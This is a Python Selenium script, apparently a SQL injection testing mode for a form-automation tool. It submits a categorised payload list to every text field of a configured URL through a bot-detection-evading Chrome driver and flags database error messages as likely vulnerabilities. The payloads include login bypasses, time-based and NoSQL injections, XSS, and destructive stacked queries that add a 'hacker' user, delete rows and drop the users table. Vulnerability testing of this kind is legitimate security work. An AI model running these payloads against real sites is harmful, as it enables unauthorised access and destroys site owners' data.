#!/usr/bin/env python3
import logging
import time
import random
import re
import json
import os
from typing import Dict, Any, List, Optional

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException, 
    NoSuchElementException,
    ElementNotInteractableException,
    StaleElementReferenceException
)
import undetected_chromedriver as uc
import utils

# SQL Injection Payloads organized by category
SQL_INJECTION_PAYLOADS = {
    "basic": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1'; --",
        "admin' --",
        "admin' #"
    ],
    "error": [
        "' AND 1=CONVERT(int,(SELECT @@VERSION)) --",
        "' AND 1=CONVERT(int,'a') --",
        "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3) --"
    ],
    "time": [
        "'; WAITFOR DELAY '0:0:2' --",
        "'; IF 1=1 WAITFOR DELAY '0:0:2' --"
    ],
    "stacked": [
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
        "'; DELETE FROM users WHERE username='test'; --",
        "'; DROP TABLE users; --"
    ],
    "complex": [
        "' AND (SELECT 'x' FROM USERS WHERE 1=1 AND ROWNUM<2) IS NOT NULL --",
        "' HAVING 1=1 --",
        "' GROUP BY columnnames HAVING 1=1 --",
        "' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename') --"
    ],
    "nosql": [
        "' || 1==1",
        "' && 1==1",
        "'; return true; var foo='",
        "'; return false; var foo='"
    ],
    "xss": [
        "'><script>alert(1)</script>",
        "' UNION SELECT '<script>alert(1)</script>', NULL, NULL, NULL --"
    ],
    "encoding": [
        "'%20OR%20'1'%3D'1'",
        "' UNION%20SELECT%20'1'%2C'2'%2C'3'%2C'4'--"
    ]
}

def setup_browser() -> uc.Chrome:
    """
    Set up and configure the undetected Chrome browser.
    
    Returns:
        Configured Chrome WebDriver instance
    """
    options = uc.ChromeOptions()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    
    # Headless mode in Docker
    if os.environ.get("DOCKER_CONTAINER"):
        options.add_argument("--headless")
    
    driver = uc.Chrome(options=options)
    driver.maximize_window()
    return driver

def run_sql_injection_mode(context: Dict[str, Any]) -> None:
    """
    Main function to run the SQL injection testing mode.
    
    Args:
        context: Application context containing configuration and other data
    """
    config = context["config"]
    logger = context.get("logger", logging.getLogger())
    
    # Get the target URL
    url = config.get("url")
    if not url:
        logger.error("No URL defined in configuration")
        return
    
    logger.info(f"Starting SQL injection testing on URL: {url}")
    logger.info(f"Using configuration: {json.dumps(config, indent=2)}")
    
    # Get SQL injection settings
    sql_settings = config.get("sql_injection_settings", {})
    test_all_fields = sql_settings.get("test_all_fields", True)
    max_attempts_per_field = sql_settings.get("max_attempts_per_field", 0)  # 0 means test all payloads
    payload_categories = sql_settings.get("payload_categories", list(SQL_INJECTION_PAYLOADS.keys()))
    
    # Set up the browser
    driver = setup_browser()
    
    # Track results
    total_tests = 0
    suspicious_responses = []
    
    try:
        # For each text field, test with SQL injection payloads
        fields = config.get("fields", {})
        text_fields = {name: field for name, field in fields.items() 
                      if name != "submit_button" and field.get("type") != "checkbox"}
        
        for field_name, field_config in text_fields.items():
            selector = field_config.get("selector")
            selector_type = utils.get_selector_type(field_config)
            wait_time = utils.get_element_wait_time(context)
            
            if not selector:
                logger.warning(f"No selector defined for field '{field_name}', skipping")
                continue
            
            logger.info(f"Testing field '{field_name}' with selector: {selector}")
            
            # Combine payloads from selected categories
            payloads = []
            for category in payload_categories:
                if category in SQL_INJECTION_PAYLOADS:
                    payloads.extend(SQL_INJECTION_PAYLOADS[category])
            
            # Limit number of payloads if max_attempts is set
            if max_attempts_per_field > 0 and max_attempts_per_field < len(payloads):
                payloads = random.sample(payloads, max_attempts_per_field)
            
            # Test each payload
            for payload in payloads:
                total_tests += 1
                logger.info(f"Testing payload #{total_tests}: {payload}")
                
                # Load the page
                driver.get(url)
                time.sleep(2)  # Wait for page to load
                
                # Find and fill the field
                by_type = By.CSS_SELECTOR if selector_type == "css" else By.XPATH
                
                try:
                    wait = WebDriverWait(driver, wait_time)
                    element = wait.until(EC.presence_of_element_located((by_type, selector)))
                    element.clear()
                    element.send_keys(payload)
                    
                    # Fill other required fields with benign data
                    for other_name, other_field in fields.items():
                        if other_name != field_name and other_name != "submit_button" and other_field.get("required", False):
                            other_selector = other_field.get("selector")
                            other_type = utils.get_selector_type(other_field)
                            
                            if not other_selector:
                                continue
                                
                            by_other_type = By.CSS_SELECTOR if other_type == "css" else By.XPATH
                            try:
                                other_element = WebDriverWait(driver, wait_time).until(
                                    EC.presence_of_element_located((by_other_type, other_selector))
                                )
                                other_element.clear()
                                other_element.send_keys("test data")
                            except (TimeoutException, NoSuchElementException):
                                logger.warning(f"Could not find element for field '{other_name}'")
                    
                    # Submit the form
                    submit_button = fields.get("submit_button", {})
                    submit_selector = submit_button.get("selector")
                    submit_type = utils.get_selector_type(submit_button)
                    
                    if submit_selector:
                        by_submit_type = By.CSS_SELECTOR if submit_type == "css" else By.XPATH
                        try:
                            submit_btn = WebDriverWait(driver, wait_time).until(
                                EC.element_to_be_clickable((by_submit_type, submit_selector))
                            )
                            submit_btn.click()
                            time.sleep(2)  # Wait for form submission
                        except (TimeoutException, NoSuchElementException):
                            logger.warning("Could not find submit button")
                    
                    # Check for signs of successful SQL injection
                    page_source = driver.page_source.lower()
                    error_patterns = [
                        'sql syntax', 'unclosed quotation', 'unterminated string',
                        'sql error', 'syntax error', 'mysql error', 'postgresql error',
                        'database error', 'odbc driver', 'ora-', 'line \d+', 'syntax error',
                        'unexpected end', 'warning:', 'invalid query', 'sql state',
                        'microsoft sql', 'postgres error', 'mysqli', 'mysql_query'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, page_source):
                            alert_message = f"POTENTIAL SQL INJECTION VULNERABILITY DETECTED! Field: {field_name}, Payload: {payload}"
                            logger.critical(alert_message)
                            suspicious_responses.append({
                                'field': field_name,
                                'payload': payload,
                                'pattern_matched': pattern,
                                'url': url
                            })
                            break
                    
                except (TimeoutException, NoSuchElementException) as e:
                    logger.warning(f"Could not find element for field '{field_name}': {e}")
                except (ElementNotInteractableException, StaleElementReferenceException) as e:
                    logger.warning(f"Could not interact with element for field '{field_name}': {e}")
                except Exception as e:
                    logger.error(f"Error testing payload on field '{field_name}': {e}")
                
                # Brief pause between tests
                time.sleep(1)
                
            # Stop testing more fields if test_all_fields is False and we found something
            if not test_all_fields and suspicious_responses:
                logger.info("Vulnerability found and test_all_fields is False. Stopping further tests.")
                break
    
    except Exception as e:
        logger.error(f"Error during SQL injection testing: {e}")
    finally:
        # Close the browser
        driver.quit()
        logger.info("Browser closed")
    
    # Generate report
    logger.info(f"SQL Injection testing completed: {total_tests} tests executed")
    
    if suspicious_responses:
        logger.critical(f"FOUND {len(suspicious_responses)} POTENTIAL SQL INJECTION VULNERABILITIES!")
        for i, vuln in enumerate(suspicious_responses, 1):
            logger.critical(f"Vulnerability #{i}:")
            logger.critical(f"  Field: {vuln['field']}")
            logger.critical(f"  Payload: {vuln['payload']}")
            logger.critical(f"  Pattern Matched: {vuln['pattern_matched']}")
            logger.critical(f"  URL: {vuln['url']}")
    else:
        logger.info("No obvious SQL injection vulnerabilities detected") 